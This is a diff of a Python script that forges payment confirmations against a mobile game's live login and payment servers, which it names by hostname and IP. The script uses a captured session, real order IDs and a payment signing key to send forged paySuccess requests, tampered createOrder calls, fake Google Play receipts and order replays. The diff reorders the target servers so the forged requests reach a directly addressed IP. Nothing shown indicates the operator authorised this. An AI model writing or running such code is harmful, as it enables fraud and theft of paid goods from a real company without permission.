@@ -26,7 +26,7 @@ import urllib3
 import requests
 from sign_helper import (QuickGameSession, SESSION, SERVERS, SIGN_KEY_PAYMENT, md5,
                          SERVER_LOGIN, SERVER_PAY, SERVER_LOGIN_ALT, SERVER_PAY_ALT,
-                         CAPTURED_ORDERS)
+                         SERVER_LOGIN_IP, SERVER_PAY_IP, CAPTURED_ORDERS)
 
 urllib3.disable_warnings()
 
@@ -36,9 +36,11 @@ urllib3.disable_warnings()
 CAPTURED_SESSION = SESSION
 CAPTURED_ORDER_ID = CAPTURED_ORDERS[0]   # 6923ddd954df8e361c1cd57dd1e14fa7 (No.8GemPackx1)
 
-# Try ALT (EU) servers first — primary (login/pay.popoh5.com) timeout from Spain
-AUTH_SERVER = SERVER_LOGIN_ALT   # https://en.sjmobilegame.com:10410
-PAY_SERVER  = SERVER_PAY_ALT     # https://en.sjmobilegame.com:10420
+# Server priority: IP-direct (confirmed reachable) → ALT → PRIMARY
+AUTH_SERVER  = SERVER_LOGIN_IP   # https://47.89.242.44:510 (SNI=login.popoh5.com)
+PAY_SERVER   = SERVER_PAY_IP     # https://47.89.242.44:520 (SNI=pay.popoh5.com)
+AUTH_ALT     = SERVER_LOGIN_ALT  # https://en.sjmobilegame.com:10410
+PAY_ALT      = SERVER_PAY_ALT    # https://en.sjmobilegame.com:10420
 AUTH_PRIMARY = SERVER_LOGIN      # https://login.popoh5.com:510
 PAY_PRIMARY  = SERVER_PAY        # https://pay.popoh5.com:520
 
@@ -58,10 +60,12 @@ def log(label: str, resp: requests.Response):
 def safe_post(endpoint: str, data: dict = None, pay_sign: bool = False,
               servers=None) -> None:
     """Try endpoint on multiple servers, print result or timeout for each."""
-    # Default: try alt servers first (EU-accessible), then primary as fallback
+    # Default order: IP-direct first (confirmed reachable), then alt, then primary hostname
     target_servers = servers or [
-        ("alt_login", AUTH_SERVER),
-        ("alt_pay",   PAY_SERVER),
+        ("ip_pay",    PAY_SERVER),
+        ("ip_login",  AUTH_SERVER),
+        ("alt_login", AUTH_ALT),
+        ("alt_pay",   PAY_ALT),
         ("primary_login", AUTH_PRIMARY),
         ("primary_pay",   PAY_PRIMARY),
     ]
@@ -121,7 +125,7 @@ def test_paysuccess_forgery():
     for i, payload in enumerate(payloads):
         # paySuccess lives on the payment server, try all if needed
         safe_post("/v1/payment/paySuccess", data=payload,
-                  servers=[("alt_pay", PAY_SERVER), ("alt_login", AUTH_SERVER), ("pay", PAY_PRIMARY), ("login", AUTH_PRIMARY)])
+                  servers=[("ip_pay", PAY_SERVER), ("ip_login", AUTH_SERVER), ("alt_login", AUTH_ALT), ("alt_pay", PAY_ALT)])
 
 
 # ─── Test 1b: paySuccess with EXACT smali-confirmed params ───────────────────
@@ -162,9 +166,7 @@ def test_paysuccess_exact_params():
             "gameRoleServerName": "Server1",
         }
         print(f"\n  → Testing real order: {cpOrderNo} ({gname})")
-        safe_post("/v1/payment/paySuccess", data=payload, pay_sign=True,
-                  servers=[("alt_pay", PAY_SERVER), ("alt_login", AUTH_SERVER),
-                           ("pay", PAY_PRIMARY), ("login", AUTH_PRIMARY)])
+        safe_post("/v1/payment/paySuccess", data=payload, pay_sign=True)
 
     # Also try with a fresh fake order — tests if ANY forged order is accepted
     fake_payload = {
@@ -174,9 +176,7 @@ def test_paysuccess_exact_params():
         "gameRoleLevel": "1", "gameRoleServerId": "1", "gameRoleServerName": "Server1",
     }
     print("\n  → Testing FAKE order (critical: should be rejected)")
-    safe_post("/v1/payment/paySuccess", data=fake_payload, pay_sign=True,
-              servers=[("alt_pay", PAY_SERVER), ("alt_login", AUTH_SERVER),
-                       ("pay", PAY_PRIMARY), ("login", AUTH_PRIMARY)])
+    safe_post("/v1/payment/paySuccess", data=fake_payload, pay_sign=True)
 
 
 # ─── Test 2: createOrder parameter tampering ──────────────────────────────────
@@ -193,7 +193,7 @@ def test_create_order_tamper():
 
     for i, data in enumerate(test_cases):
         safe_post("/v1/auth/createOrder", data=data,
-                  servers=[("alt_login", AUTH_SERVER), ("alt_pay", PAY_SERVER), ("login", AUTH_PRIMARY), ("pay", PAY_PRIMARY)])
+                  servers=[("ip_login", AUTH_SERVER), ("ip_pay", PAY_SERVER), ("alt_login", AUTH_ALT), ("alt_pay", PAY_ALT)])
 
 
 # ─── Test 3: Google Play receipt forgery ─────────────────────────────────────
@@ -226,7 +226,7 @@ def test_google_play_receipt_forge():
 
     for i, payload in enumerate(payloads):
         safe_post("/v1/user/postGooglePlayVerify", data=payload,
-                  servers=[("alt_login", AUTH_SERVER), ("alt_pay", PAY_SERVER), ("login", AUTH_PRIMARY), ("pay", PAY_PRIMARY)])
+                  servers=[("ip_login", AUTH_SERVER), ("ip_pay", PAY_SERVER), ("alt_login", AUTH_ALT), ("alt_pay", PAY_ALT)])
 
 
 # ─── Test 4: Order replay attack ──────────────────────────────────────────────
@@ -248,7 +248,7 @@ def test_order_replay(real_order_id: str = None):
 
     for attempt in range(3):
         safe_post("/v1/payment/paySuccess", data=payload,
-                  servers=[("alt_pay", PAY_SERVER), ("alt_login", AUTH_SERVER), ("pay", PAY_PRIMARY), ("login", AUTH_PRIMARY)])
+                  servers=[("ip_pay", PAY_SERVER), ("ip_login", AUTH_SERVER), ("alt_login", AUTH_ALT), ("alt_pay", PAY_ALT)])
         time.sleep(1)
 
 
